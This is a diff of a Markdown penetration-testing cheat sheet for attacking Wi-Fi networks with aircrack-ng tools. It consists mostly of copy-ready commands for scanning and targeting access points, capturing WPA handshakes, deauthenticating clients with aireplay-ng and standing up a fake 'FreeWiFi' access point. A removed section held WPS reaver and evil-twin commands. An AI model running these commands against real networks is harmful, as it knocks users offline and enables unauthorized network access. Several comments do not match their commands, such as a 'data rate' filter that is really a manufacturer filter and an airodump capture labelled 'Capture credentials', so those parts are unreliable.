@@ -120,106 +120,163 @@ sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF captur
 
 ## 🎯 AP Discovery & Targeting
 
-### **Basic AP Scan**
-```bash
-# Scan all channels
-sudo airodump-ng wlan0mon
+=== "Basic Scanning"
 
-# Scan specific channel
-sudo airodump-ng -c 6 wlan0mon
+    ### **Basic AP Scan**
+    ```bash
+    # Scan all channels
+    sudo airodump-ng wlan0mon
 
-# Scan multiple channels
-sudo airodump-ng -c 1,6,11 wlan0mon
-```
+    # Scan specific channel
+    sudo airodump-ng -c 6 wlan0mon
 
-### **Target Specific Networks**
-```bash
-# Target by BSSID
-sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
+    # Scan multiple channels
+    sudo airodump-ng -c 1,6,11 wlan0mon
+    ```
 
-# Target by ESSID (network name)
-sudo airodump-ng -c 6 --essid "TargetNetwork" wlan0mon
+    !!! tip "Channel Selection"
+        - **2.4GHz**: Channels 1, 6, 11 (non-overlapping)
+        - **5GHz**: Channels 36, 40, 44, 48
+        - **Scan all**: Use `wlan0mon` without channel specification
 
-# Target with file output
-sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
-```
+=== "Target Specific"
 
-### **Advanced Filtering**
-```bash
-# Filter by encryption
-sudo airodump-ng --encrypt WPA wlan0mon
+    ### **Target Specific Networks**
+    ```bash
+    # Target by BSSID
+    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
 
-# Filter by signal strength
-sudo airodump-ng --manufacturer "Cisco" wlan0mon
+    # Target by ESSID (network name)
+    sudo airodump-ng -c 6 --essid "TargetNetwork" wlan0mon
 
-# Filter by data rate
-sudo airodump-ng --manufacturer "Netgear" wlan0mon
-```
+    # Target with file output
+    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+    ```
+
+    !!! info "Targeting Strategy"
+        1. **Broad scan** to identify all APs
+        2. **Narrow down** by channel or BSSID
+        3. **Capture** specific targets
+
+=== "Advanced Filtering"
+
+    ### **Advanced Filtering**
+    ```bash
+    # Filter by encryption
+    sudo airodump-ng --encrypt WPA wlan0mon
+
+    # Filter by manufacturer
+    sudo airodump-ng --manufacturer "Cisco" wlan0mon
+
+    # Filter by data rate
+    sudo airodump-ng --manufacturer "Netgear" wlan0mon
+    ```
+
+    !!! warning "Filtering Tips"
+        - Use **encryption filters** to find WEP/WPA networks
+        - **Manufacturer filters** help identify specific router types
+        - **Signal strength** filtering finds high-power targets
 
 ---
 
 ## 🔍 Channel & SSID Targeting
 
-### **Channel Analysis**
-```bash
-# Scan specific channel range
-sudo airodump-ng -c 1-6 wlan0mon
+=== "Channel Analysis"
 
-# Focus on 2.4GHz channels
-sudo airodump-ng -c 1,6,11 wlan0mon
+    ### **Channel Analysis**
+    ```bash
+    # Scan specific channel range
+    sudo airodump-ng -c 1-6 wlan0mon
 
-# Focus on 5GHz channels
-sudo airodump-ng -c 36,40,44,48 wlan0mon
-```
+    # Focus on 2.4GHz channels
+    sudo airodump-ng -c 1,6,11 wlan0mon
 
-### **SSID Targeting Strategy**
-```bash
-# 1. Initial broad scan
-sudo airodump-ng wlan0mon
+    # Focus on 5GHz channels
+    sudo airodump-ng -c 36,40,44,48 wlan0mon
+    ```
 
-# 2. Identify target channel
-sudo airodump-ng -c [TARGET_CHANNEL] wlan0mon
+    !!! info "Channel Selection Guide"
+        - **2.4GHz**: 1, 6, 11 (non-overlapping)
+        - **5GHz**: 36, 40, 44, 48 (common channels)
+        - **Range scanning**: Use `-c 1-6` for multiple channels
 
-# 3. Focus on specific BSSID
-sudo airodump-ng -c [CHANNEL] --bssid [BSSID] wlan0mon
+=== "SSID Strategy"
 
-# 4. Capture handshake
-sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w capture wlan0mon
-```
+    ### **SSID Targeting Strategy**
+    ```bash
+    # 1. Initial broad scan
+    sudo airodump-ng wlan0mon
+
+    # 2. Identify target channel
+    sudo airodump-ng -c [TARGET_CHANNEL] wlan0mon
+
+    # 3. Focus on specific BSSID
+    sudo airodump-ng -c [CHANNEL] --bssid [BSSID] wlan0mon
+
+    # 4. Capture handshake
+    sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w capture wlan0mon
+    ```
+
+    !!! tip "Targeting Workflow"
+        1. **Broad scan** to see all networks
+        2. **Channel focus** to reduce noise
+        3. **BSSID targeting** for specific AP
+        4. **Handshake capture** for cracking
 
 ---
 
 ## ⚡ Handshake Capture Process
 
-### **Method 1: Passive Capture**
-```bash
-# Start capture
-sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
+=== "Passive Capture"
 
-# Wait for client to connect naturally
-# Monitor for WPA handshake in top-right corner
-```
+    ### **Method 1: Passive Capture**
+    ```bash
+    # Start capture
+    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
 
-### **Method 2: Active Deauth Attack**
-```bash
-# Terminal 1: Capture handshake
-sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
+    # Wait for client to connect naturally
+    # Monitor for WPA handshake in top-right corner
+    ```
 
-# Terminal 2: Deauth attack
-sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+    !!! info "Passive Method"
+        - **Pros**: No interference, stealthy
+        - **Cons**: Requires patience, depends on client activity
+        - **Best for**: High-traffic networks with regular connections
 
-# Terminal 3: Target specific client
-sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC:ADDR wlan0mon
-```
+=== "Active Deauth"
 
-### **Method 3: Fake AP Attack**
-```bash
-# Create fake AP
-sudo airbase-ng -a AA:BB:CC:DD:EE:FF --essid "FreeWiFi" wlan0mon
+    ### **Method 2: Active Deauth Attack**
+    ```bash
+    # Terminal 1: Capture handshake
+    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
 
-# Capture handshakes from connecting clients
-sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w fake_handshake wlan0mon
-```
+    # Terminal 2: Deauth attack
+    sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+    # Terminal 3: Target specific client
+    sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC:ADDR wlan0mon
+    ```
+
+    !!! warning "Active Method"
+        - **Pros**: Faster results, more reliable
+        - **Cons**: More detectable, may cause network disruption
+        - **Best for**: Testing environments, authorized assessments
+
+=== "Fake AP Attack"
+
+    ### **Method 3: Fake AP Attack**
+    ```bash
+    # Create fake AP
+    sudo airbase-ng -a AA:BB:CC:DD:EE:FF --essid "FreeWiFi" wlan0mon
+
+    # Capture handshakes from connecting clients
+    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w fake_handshake wlan0mon
+    ```
+
+    !!! danger "Fake AP Method"
+        - **Pros**: Can capture multiple handshakes
+        - **Cons**: Highly detectable, requires careful setup
+        - **Best for**: Advanced testing, social engineering scenarios
 
 ---
 
@@ -260,39 +317,7 @@ hashcat -m 2500 -d 1 handshake.hccapx /usr/share/wordlists/rockyou.txt
 
 ---
 
-## 🛠️ Advanced Techniques
 
-### **WPS Attacks**
-```bash
-# WPS PIN attack
-sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
-
-# WPS with pixie dust
-sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
-
-# WPS with specific PIN
-sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345670 -vv
-```
-
-### **Evil Twin Attacks**
-```bash
-# Create evil twin
-sudo airbase-ng -a AA:BB:CC:DD:EE:FF --essid "TargetNetwork" wlan0mon
-
-# Capture credentials
-sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w evil_capture wlan0mon
-```
-
-### **Rogue AP Detection**
-```bash
-# Monitor for rogue APs
-sudo airodump-ng --manufacturer "Unknown" wlan0mon
-
-# Check for duplicate ESSIDs
-sudo airodump-ng --essid "TargetNetwork" wlan0mon
-```
-
----
 
 ## 📊 Monitoring & Analysis
 
